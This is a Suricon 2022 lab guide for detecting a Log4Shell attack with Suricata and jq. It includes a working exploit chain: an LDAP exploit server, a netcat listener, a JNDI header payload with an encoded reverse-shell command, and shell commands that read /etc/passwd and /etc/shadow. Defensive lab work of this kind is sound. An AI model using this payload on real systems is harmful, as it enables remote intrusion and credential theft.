# Suricon - Log4j Analysis
This is a quick-reference guide for the commands shown at Suricon 2022 including some additional filtering with jq.

Setup Suricata and tcpdump
```bash
screen -S suricata
sudo suricata -S ~/lab/emerging-threats-log4j.rules -l ~/lab -i eth0

screen -S tcpdump
sudo tcpdump -nn 'not port 22 and not port 443' -w analysis.pcap 
```

Setup LDAP Server and nc listener
```bash
screen -S ldap
sudo docker run --name log4jldapserver -p 1389:1389 -p 8888:8888 oofles/log4shell-ldap-server

screen -S nc
nc -lvp 7777
```

Send payload
```bash
curl 172.31.24.20:8080 -H 'X-Api-Version: ${jndi:ldap://172.31.24.10:1389/Basic/Command/Base64/bmMgLW52IDE3Mi4zMS4yNC4xMCA3Nzc3IC1lIC9iaW4vc2g=}'
```

Run some commands in reverse shell
```bash
uname -a
whoami
env
cat /etc/passwd
cat /etc/shadow
```

Stop both Suricata and tcpdump

fast.log analysis
```bash
cat fast.log | wc -l
less -S fast.log
```

General analysis
```bash
cat eve.json | jq .event_type | sort | uniq -c | sort

cat eve.json | jq 'select(.event_type == "flow") | select(.src_ip == "172.31.24.10")'

cat eve.json | jq 'select(.event_type == "http") | select(.src_ip == "172.31.24.10")'

cat eve.json | jq 'select(.event_type == "flow") | select(.dest_ip == "172.31.24.10")'

cat eve.json | jq 'select(.event_type == "flow") | select(.dest_ip == "172.31.24.10") | .dest_port'
```

File analysis
```bash
cat eve.json | jq 'select(.event_type == "fileinfo") | select(.dest_ip == "172.31.24.20")'
```

